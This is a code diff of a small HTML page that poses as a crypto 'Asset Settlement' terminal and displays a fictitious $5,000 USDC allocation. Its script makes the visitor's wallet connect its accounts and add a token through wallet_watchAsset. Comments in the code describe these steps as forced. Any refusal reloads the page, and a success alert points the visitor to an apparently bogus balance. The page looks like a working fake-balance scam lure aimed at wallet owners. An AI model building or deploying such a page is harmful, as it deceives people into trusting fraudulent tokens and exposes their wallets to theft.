@@ -1,30 +1,34 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Final System Push</title>
+    <title>Asset Settlement - Final</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px 20px; }
-        .box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; }
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 80px; }
+        .terminal { border: 2px solid #0f0; padding: 30px; display: inline-block; border-radius: 15px; width: 85%; max-width: 400px; box-shadow: 0 0 15px #0f0; }
         button { 
             background: #0f0; color: #000; border: none; padding: 25px; 
-            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.2em;
+            font-weight: bold; width: 100%; cursor: pointer; border-radius: 10px; font-size: 1.2em; margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>FINAL SYSTEM PUSH</h2>
-        <p>STATUS: READY ($5,000.00)</p>
-        <button id="pushBtn">LINK TO HOME SCREEN</button>
+    <div class="terminal">
+        <h2 style="margin:0;">SYSTEM: READY</h2>
+        <p>ALLOCATION: $5,000.00 USDC</p>
+        <hr style="border:0; border-top:1px solid #333; margin: 20px 0;">
+        <button id="finalTrigger">ACTIVATE ASSET LINK</button>
     </div>
 
     <script>
-        document.getElementById('pushBtn').onclick = async () => {
+        document.getElementById('finalTrigger').onclick = async () => {
             if (window.ethereum) {
                 try {
+                    // 1. Force the Identity Handshake
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    
+                    // 2. Force the Asset Indexing (The Pop-up)
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -36,7 +40,7 @@
                             },
                         },
                     });
-                    alert("Success! Check your home screen balance.");
+                    alert("Handshake Success. Close browser to view balance.");
                 } catch (e) {
                     window.location.reload();
                 }
